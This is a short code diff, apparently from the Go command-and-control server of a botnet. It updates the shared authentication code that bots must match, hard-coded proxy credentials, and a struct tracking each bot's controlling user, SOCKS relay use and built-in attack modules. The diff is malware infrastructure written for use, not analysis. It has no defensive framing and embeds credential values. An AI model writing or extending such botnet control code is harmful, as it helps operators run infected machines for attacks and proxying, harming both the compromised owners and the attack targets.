@@ -40,12 +40,12 @@ const (
 	USER_SERVER_PORT = "420"
 
 	// Authentication  these must match bot
-	MAGIC_CODE       = "McDPahp5&tAo$F1y"
-	PROTOCOL_VERSION = "r4.6-stable"
+	MAGIC_CODE       = "c0QfIab3^u#7YaJn"
+	PROTOCOL_VERSION = "V2_2"
 )
 
-var bakedProxyUser = "7emOZVbqgcAC" // change me run setup.py
-var bakedProxyPass = "BUdiLg8CT4Nt" // change me run setup.py
+var bakedProxyUser = "S2OvSHWuCMeK" // change me run setup.py
+var bakedProxyPass = "wRvQdo36s2J8" // change me run setup.py
 
 // RelayEntry represents a relay in relays.json.
 type RelayEntry struct {
@@ -132,10 +132,12 @@ type BotConnection struct {
 	processName   string   // Running process name
 	uplinkMbps    float64  // Uplink speed in Mbps
 	country       string   // GeoIP country code
-	userConn      net.Conn // Track which user is controlling this bot
-	socksActive   bool
-	socksRelay    string
-	socksUser     string
+	userConn        net.Conn // Track which user is controlling this bot
+	socksActive     bool
+	socksRelay      string
+	socksUser       string
+	attacksEnabled  bool     // bot was built with attack modules
+	socksEnabled    bool     // bot was built with SOCKS module
 }
 
 type client struct {
